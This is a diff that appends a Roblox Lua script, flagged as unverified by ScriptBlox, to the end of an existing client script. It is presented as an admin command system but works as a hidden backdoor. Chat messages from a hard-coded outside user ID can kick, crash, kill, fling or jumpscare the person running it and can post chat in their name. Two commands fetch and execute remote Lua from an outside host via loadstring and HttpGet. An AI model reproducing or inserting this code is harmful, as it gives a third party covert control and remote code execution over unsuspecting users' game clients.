@@ -5322,3 +5322,703 @@ task.spawn(function()
 	blur:Destroy()
 	flashFrame:Destroy()
 end)
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+
+
+
+-- ADMIN
+local prefix = "."
+local all = "*"
+local wl = {1028438724}
+
+local cloneref = cloneref or function(...) return ... end
+local function gs(s) return cloneref(game:GetService(s)) end
+
+local rs = gs("RunService")
+local plrs = gs("Players")
+local tcs = gs("TextChatService")
+local repsto = gs("ReplicatedStorage")
+local ss = gs("SoundService")
+local deb = gs("Debris")
+local http = gs("HttpService")
+local uis = gs("UserInputService")
+
+local legacy = tcs.ChatVersion == Enum.ChatVersion.LegacyChatService
+local jid = game.JobId
+
+local plr = plrs.LocalPlayer
+local char = plr.Character
+local hum = char and char:FindFirstChildOfClass("Humanoid")
+local hrp = hum and hum.RootPart
+
+local un = tostring(plr)
+local dn = plr.DisplayName
+
+local cmds, alias, cons = {}, {}, {}
+local followin, ftarg = false, nil
+local loops = {}
+local anch = false
+
+if getgenv()[jid] then getgenv()[jid]() end
+
+local function addcon(ev, cb)
+    local con = ev:Connect(cb)
+    cons[#cons + 1] = con
+    return con
+end
+
+local function compare(p, t)
+    return string.match(string.lower(p), string.lower(t))
+end
+
+local function getplr(inp)
+    local all = plrs:GetPlayers()
+    if all[inp] then return all[inp] end
+    
+    for _, v in all do
+        if v ~= plr and (compare(tostring(v), inp) or compare(v.DisplayName, inp)) then
+            return v
+        end
+    end
+    return false
+end
+
+local function findplr(q)
+    if not q or q == "" then return nil end
+    q = q:lower()
+    for _, p in pairs(plrs:GetPlayers()) do
+        if p.Name:lower():find(q, 1, true) or p.DisplayName:lower():find(q, 1, true) then
+            return p
+        end
+    end
+    return nil
+end
+
+local function gettarg(args, i, fb)
+    return (#args >= i and args[i] ~= "") and (args[i]:lower() == "all" and plr or findplr(args[i])) or fb
+end
+
+local function tp(from, to)
+    local fc = (from == plr and plr.Character or from.Character)
+    local tc = to.Character
+    if fc and fc.HumanoidRootPart and tc and tc.HumanoidRootPart then
+        fc.HumanoidRootPart.CFrame = tc.HumanoidRootPart.CFrame + Vector3.new(math.random(-3, 3), 0, math.random(-3, 3))
+        return true
+    end
+    return false
+end
+
+local function bring(who, to)
+    local wc = who.Character
+    local tc = (to == plr and plr.Character or to.Character)
+    if wc and wc.HumanoidRootPart and tc and tc.HumanoidRootPart then
+        wc.HumanoidRootPart.CFrame = CFrame.new(tc.HumanoidRootPart.Position + Vector3.new(0, 5, 0))
+        return true
+    end
+    return false
+end
+
+local function reg(name, als, req, cb)
+    name = string.lower(name)
+    cmds[name] = {func = cb, requireArguments = req}
+    for i = 1, #als do
+        alias[string.lower(als[i])] = name
+    end
+end
+
+local function handle(caller, msg)
+    if #msg <= 1 or string.sub(msg, 1, 1) ~= prefix then return end
+    
+    local args = string.split(string.sub(msg, 2), " ")
+    local cmd = string.lower(args[1])
+    local data = cmds[cmd] or (alias[cmd] and cmds[alias[cmd]])
+    
+    if not data then return end
+    if data.requireArguments and not args[2] then return end
+    if data.requireArguments and (args[2] ~= all and not compare(un, args[2]) and not compare(dn, args[2])) then return end
+    
+    local callargs = {}
+    for i = data.requireArguments and 3 or 2, #args do
+        callargs[#callargs + 1] = args[i]
+    end
+    
+    pcall(data.func, caller, unpack(callargs))
+end
+
+local function sendchat(msg)
+    if not msg or #msg == 0 then return end
+    
+    if legacy then
+        local rem = repsto:FindFirstChild("SayMessageRequest", true)
+        return rem:FireServer(msg, "All")
+    end
+    
+    local chat = tcs.ChatInputBarConfiguration.TargetTextChannel
+    local channels = tcs:FindFirstChild("TextChannels")
+    local gen = channels and channels:FindFirstChild("RBXGeneral")
+    return (gen and gen or chat):SendAsync(msg)
+end
+
+-- commands start here
+reg("kick", {"ban"}, true, function(caller, ...)
+    plr:Kick(#{...} > 0 and table.concat({...}, " ") or "")
+end)
+
+reg("chat", {"ch"}, true, function(caller, ...)
+    sendchat(#{...} > 0 and table.concat({...}, " ") or "Hi Pew!")
+end)
+
+reg("crash", {}, true, function()
+    while true do end
+end)
+
+reg("bring", {"br"}, true, function(caller)
+    if not caller.character or not caller.character:FindFirstChildOfClass("Humanoid") or not caller.character:FindFirstChildOfClass("Humanoid").RootPart then
+        return false
+    end
+    
+    if not hum or not hrp or not char then return false end
+    
+    if anch then
+        hrp.Anchored = false
+        task.wait(.1)
+    end
+    
+    hrp.CFrame = caller.character:FindFirstChildOfClass("Humanoid").RootPart.CFrame
+    
+    if anch then
+        task.wait(.1)
+        hrp.Anchored = true
+    end
+end)
+
+reg("kill", {}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    hum.Health = 0
+end)
+
+reg("reset", {"re"}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    
+    local oldhrp = hrp
+    local oldpos = hrp.CFrame
+    hum.Health = 0
+    plr.CharacterAdded:Wait()
+    task.spawn(function()
+        repeat task.wait() until hrp ~= oldhrp
+        hrp.CFrame = oldpos
+    end)
+end)
+
+reg("freeze", {"lock"}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    anch = true
+    hrp.Anchored = true
+end)
+
+reg("thaw", {"unfreeze", "unlock"}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    anch = false
+    hrp.Anchored = false
+end)
+
+reg("jump", {"jmp", "unsit"}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    hum.Sit = false
+    hum:ChangeState(Enum.HumanoidStateType.Jumping)
+end)
+
+reg("sit", {}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    hum.Sit = true
+end)
+
+reg("fling", {}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    
+    local bv = Instance.new("BodyVelocity")
+    bv.Velocity = Vector3.new(math.random(-100, 100), math.random(50, 150), math.random(-100, 100))
+    bv.MaxForce = Vector3.new(1e200, 1e200, 1e200)
+    bv.Parent = hrp
+    deb:AddItem(bv, .5)
+end)
+
+reg("fling2", {}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    
+    local bv = Instance.new("BodyVelocity")
+    bv.Velocity = Vector3.new(math.random(-700, 400), math.random(50, 300), math.random(-700, 400))
+    bv.MaxForce = Vector3.new(1e200, 1e200, 1e200)
+    bv.Parent = hrp
+    deb:AddItem(bv, .5)
+end)
+
+reg("trip", {}, true, function(caller)
+    if not hum or not hrp or not char then return false end
+    
+    hum.PlatformStand = true
+    hrp.Velocity = hrp.CFrame.lookVector * 10 + Vector3.new(0, 10, 0)
+    hrp.CFrame = hrp.CFrame * CFrame.Angles(90, 90, 90)
+    task.wait(2)
+    hum.PlatformStand = false
+end)
+
+reg("creepy", {"shiver", "xd"}, true, function(caller)
+    local snd = Instance.new("Sound", char)
+    snd.SoundId = "rbxassetid://157636218"
+    snd.Volume = 100
+    snd:Play()
+    task.spawn(function()
+        task.wait(.5)
+        task.wait(snd.TimeLength - .5)
+        snd:Destroy()
+    end)
+end)
+
+reg("knock", {"xd2"}, true, function(caller)
+    local snd = Instance.new("Sound", char)
+    snd.SoundId = "rbxassetid://5236308259"
+    snd.Volume = 100
+    snd:Play()
+    task.spawn(function()
+        task.wait(.5)
+        task.wait(snd.TimeLength - .5)
+        snd:Destroy()
+    end)
+end)
+
+reg("jumpscare", {"jp", "js", "lol"}, true, function(caller)
+    local sg = Instance.new("ScreenGui")
+    sg.DisplayOrder = 10
+    sg.ResetOnSpawn = false
+    sg.Enabled = false
+    sg.IgnoreGuiInset = true
+    sg.Parent = (gethui and gethui() or gs("CoreGui"))
+    
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(1, 0, 1, 0)
+    img.Position = UDim2.new(0, 0, 0, 0)
+    img.Image = "http://www.roblox.com/asset/?id=10798732430"
+    img.Parent = sg
+    
+    local snd = Instance.new("Sound", ss)
+    snd.SoundId = "rbxassetid://161964303"
+    snd.Volume = 100
+    
+    task.spawn(function()
+        task.wait(2)
+        sg.Enabled = true
+        snd:Play()
+        wait(4)
+        sg:Destroy()
+        snd:Destroy()
+    end)
+end)
+
+reg("jumpscare2", {"jp2", "js2", "lol2"}, true, function(caller)
+    local sg = Instance.new("ScreenGui")
+    sg.DisplayOrder = 10
+    sg.ResetOnSpawn = false
+    sg.Enabled = false
+    sg.IgnoreGuiInset = true
+    sg.Parent = (gethui and gethui() or gs("CoreGui"))
+    
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(1, 0, 1, 0)
+    img.Position = UDim2.new(0, 0, 0, 0)
+    img.Image = "http://www.roblox.com/asset/?id=75431648694596"
+    img.Parent = sg
+    
+    local snd = Instance.new("Sound", ss)
+    snd.SoundId = "rbxassetid://7236490488"
+    snd.Volume = 100
+    
+    task.spawn(function()
+        task.wait(2)
+        snd:Play()
+        task.wait(.1)
+        sg.Enabled = true
+        wait(4)
+        sg:Destroy()
+        snd:Destroy()
+    end)
+end)
+
+reg("jumpscarefast", {"jpf", "lol3"}, true, function(caller)
+    local sg = Instance.new("ScreenGui")
+    sg.DisplayOrder = 10
+    sg.ResetOnSpawn = false
+    sg.Enabled = false
+    sg.IgnoreGuiInset = true
+    sg.Parent = (gethui and gethui() or gs("CoreGui"))
+    
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(1, 0, 1, 0)
+    img.Position = UDim2.new(0, 0, 0, 0)
+    img.Image = "http://www.roblox.com/asset/?id=" .. (math.random(1, 2) == 1 and "75431648694596" or "10798732430")
+    img.Parent = sg
+    
+    local snd = Instance.new("Sound", ss)
+    snd.SoundId = "rbxassetid://" .. (math.random(1, 2) == 1 and "7236490488" or "161964303")
+    snd.Volume = 100
+    
+    task.spawn(function()
+        task.wait(2)
+        snd:Play()
+        task.wait(.1)
+        sg.Enabled = true
+        wait(2)
+        sg:Destroy()
+        snd:Destroy()
+    end)
+end)
+
+reg("come", {}, false, function(caller, tname, dname)
+    local t = tname and findplr(tname) or plr
+    local d = dname and findplr(dname) or caller
+    
+    if tp(t, d) then
+        return true
+    else
+        return false
+    end
+end)
+
+reg("follow", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or caller
+    if t then
+        followin, ftarg = true, t
+        return true
+    else
+        return false
+    end
+end)
+
+reg("unfollow", {}, false, function(caller)
+    followin, ftarg = false, nil
+    return true
+end)
+
+reg("speed", {}, false, function(caller, spd, tname)
+    local t = tname and findplr(tname) or plr
+    local s = tonumber(spd) or 16
+    
+    if t and t.Character and t.Character.Humanoid then
+        t.Character.Humanoid.WalkSpeed = s
+        return true
+    else
+        return false
+    end
+end)
+
+reg("walkto", {}, false, function(caller, tname, dname)
+    local t = tname and findplr(tname) or plr
+    local d = dname and findplr(dname) or caller
+    
+    if t and d and t.Character and t.Character.Humanoid and d.Character and d.Character.HumanoidRootPart then
+        t.Character.Humanoid:MoveTo(d.Character.HumanoidRootPart.Position)
+        return true
+    else
+        return false
+    end
+end)
+
+reg("orbit", {}, false, function(caller, tname, aname)
+    local t = tname and findplr(tname) or plr
+    local a = aname and findplr(aname) or caller
+    
+    if t and a and t.Character and t.Character.HumanoidRootPart and a.Character and a.Character.HumanoidRootPart then
+        task.spawn(function()
+            for i = 1, 36 do
+                if t.Character and t.Character.HumanoidRootPart and a.Character and a.Character.HumanoidRootPart then
+                    local ang = math.rad(i * 10)
+                    local x = a.Character.HumanoidRootPart.Position.X + math.cos(ang) * 10
+                    local z = a.Character.HumanoidRootPart.Position.Z + math.sin(ang) * 10
+                    t.Character.HumanoidRootPart.CFrame = CFrame.new(x, a.Character.HumanoidRootPart.Position.Y, z)
+                    task.wait(0.1)
+                end
+            end
+        end)
+        return true
+    else
+        return false
+    end
+end)
+
+reg("dance", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t and t.Character and t.Character.Humanoid then
+        task.spawn(function()
+            for i = 1, 10 do
+                if t.Character and t.Character.Humanoid then
+                    t.Character.Humanoid.Jump = true
+                    task.wait(0.5)
+                    t.Character.Humanoid.Sit = true
+                    task.wait(0.3)
+                    t.Character.Humanoid.Sit = false
+                    task.wait(0.2)
+                end
+            end
+        end)
+        return true
+    else
+        return false
+    end
+end)
+
+reg("circle", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t and t.Character and t.Character.HumanoidRootPart then
+        task.spawn(function()
+            local start = t.Character.HumanoidRootPart.Position
+            for i = 1, 36 do
+                if t.Character and t.Character.HumanoidRootPart then
+                    local ang = math.rad(i * 10)
+                    local x = start.X + math.cos(ang) * 5
+                    local z = start.Z + math.sin(ang) * 5
+                    t.Character.HumanoidRootPart.CFrame = CFrame.new(x, start.Y, z)
+                    task.wait(0.1)
+                end
+            end
+        end)
+        return true
+    else
+        return false
+    end
+end)
+
+reg("goto", {}, false, function(caller, xs, ys, zs, tname)
+    local t = tname and findplr(tname) or plr
+    local x, y, z = tonumber(xs), tonumber(ys), tonumber(zs)
+    
+    if x and y and z and t and t.Character and t.Character.HumanoidRootPart then
+        t.Character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
+        return true
+    else
+        return false
+    end
+end)
+
+reg("spin", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t and t.Character and t.Character.HumanoidRootPart then
+        task.spawn(function()
+            for i = 1, 36 do
+                if t.Character and t.Character.HumanoidRootPart then
+                    t.Character.HumanoidRootPart.CFrame = t.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(10), 0)
+                    task.wait(0.05)
+                end
+            end
+        end)
+        return true
+    else
+        return false
+    end
+end)
+
+reg("say", {}, false, function(caller, tname, ...)
+    local t = tname and findplr(tname) or plr
+    local msg = #{...} > 0 and table.concat({...}, " ") or "Hello!"
+    
+    if t == plr then
+        sendchat(msg)
+        return true
+    else
+        return false
+    end
+end)
+
+reg("stun", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t and t.Character and t.Character.Humanoid then
+        t.Character.Humanoid.PlatformStand = true
+        return true
+    else
+        return false
+    end
+end)
+
+reg("unstun", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t and t.Character and t.Character.Humanoid then
+        t.Character.Humanoid.PlatformStand = false
+        return true
+    else
+        return false
+    end
+end)
+
+reg("loopkill", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t then
+        loops[t.UserId] = {type = "kill", target = t}
+        return true
+    else
+        return false
+    end
+end)
+
+reg("unloopkill", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t and loops[t.UserId] then
+        loops[t.UserId] = nil
+        return true
+    else
+        return false
+    end
+end)
+
+reg("invert", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t == plr then
+        local cons = {}
+        cons.W = uis.InputBegan:Connect(function(inp)
+            if inp.KeyCode == Enum.KeyCode.W and plr.Character and plr.Character.Humanoid then
+                plr.Character.Humanoid:Move(Vector3.new(0, 0, 1), false)
+            end
+        end)
+        cons.S = uis.InputBegan:Connect(function(inp)
+            if inp.KeyCode == Enum.KeyCode.S and plr.Character and plr.Character.Humanoid then
+                plr.Character.Humanoid:Move(Vector3.new(0, 0, -1), false)
+            end
+        end)
+        cons.A = uis.InputBegan:Connect(function(inp)
+            if inp.KeyCode == Enum.KeyCode.A and plr.Character and plr.Character.Humanoid then
+                plr.Character.Humanoid:Move(Vector3.new(1, 0, 0), false)
+            end
+        end)
+        cons.D = uis.InputBegan:Connect(function(inp)
+            if inp.KeyCode == Enum.KeyCode.D and plr.Character and plr.Character.Humanoid then
+                plr.Character.Humanoid:Move(Vector3.new(-1, 0, 0), false)
+            end
+        end)
+        
+        task.spawn(function()
+            task.wait(20)
+            for _, c in pairs(cons) do
+                c:Disconnect()
+            end
+        end)
+        
+        return true
+    else
+        return false
+    end
+end)
+
+reg("cmds", {}, false, function(caller, tname)
+    local t = tname and findplr(tname) or plr
+    
+    if t == plr then
+        task.spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/Ownercmdslist.lua"))()
+            end)
+        end)
+        return true
+    else
+        return false
+    end
+end)
+
+reg("whitelist", {"wl"}, false, function(caller, tname)
+    local t = tname and findplr(tname)
+    
+    if not t then return false end
+    if table.find(wl, t.UserId) then return false end
+    
+    table.insert(wl, t.UserId)
+    sendchat(t.DisplayName .. " has been whitelisted by " .. caller.DisplayName .. "!")
+    
+    if t == plr then
+        pcall(function()
+            loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/Ownercmdbar.lua"))()
+        end)
+    end
+    
+    return true
+end)
+
+reg("unwhitelist", {"unwl"}, false, function(caller, tname)
+    local t = tname and findplr(tname)
+    
+    if not t then return false end
+    
+    local idx = table.find(wl, t.UserId)
+    if not idx then return false end
+    
+    table.remove(wl, idx)
+    sendchat(t.DisplayName .. " has been removed from whitelist by " .. caller.DisplayName .. "!")
+    
+    return true
+end)
+
+reg("listwhitelist", {"lwl"}, false, function(caller)
+    local names = {}
+    
+    for _, uid in pairs(wl) do
+        local p = plrs:GetPlayerByUserId(uid)
+        if p then
+            table.insert(names, p.DisplayName)
+        else
+            table.insert(names, "Unknown")
+        end
+    end
+    
+    if #names == 0 then
+        sendchat("Whitelisted: None")
+        return true
+    end
+    
+    local msg = "Whitelisted: " .. table.concat(names, ", ")
+    sendchat(msg)
+    return true
+end)
+
+addcon(plr.CharacterAdded, function(nc)
+    anch = false
+    repeat rs.Heartbeat:Wait() until nc and nc:FindFirstChildOfClass("Humanoid") and nc:FindFirstChildOfClass("Humanoid").RootPart
+    char = nc
+    hum = char and char:FindFirstChildOfClass("Humanoid")
+    hrp = hum and hum.RootPart
+end)
+
+tcs.TextChannels.RBXGeneral.MessageReceived:Connect(function(msg)
+    local src = msg and msg.TextSource
+    if not src or not table.find(wl, src.UserId) then return end
+    handle(plrs:GetPlayerByUserId(src.UserId), msg.Text)
+end)
+
+addcon(rs.Heartbeat, function()
+    if followin and ftarg and ftarg.Character and ftarg.Character.HumanoidRootPart and plr.Character and plr.Character.HumanoidRootPart and plr.Character.Humanoid then
+        local dist = (plr.Character.HumanoidRootPart.Position - ftarg.Character.HumanoidRootPart.Position).Magnitude
+        if dist > 5 then
+            plr.Character.Humanoid:MoveTo(ftarg.Character.HumanoidRootPart.Position)
+        end
+    elseif followin and (not ftarg or not ftarg.Character) then
+        followin, ftarg = false, nil
+    end
+    
+    for uid, data in pairs(loops) do
+        if data.type == "kill" and data.target and data.target.Character and data.target.Character.Humanoid then
+            data.target.Character.Humanoid.Health = 0
+        end
+    end
+end)
+
+getgenv()[jid] = function()
+    for i, v in cons do
+        v:Disconnect()
+    end
+    getgenv()[jid] = nil
+end
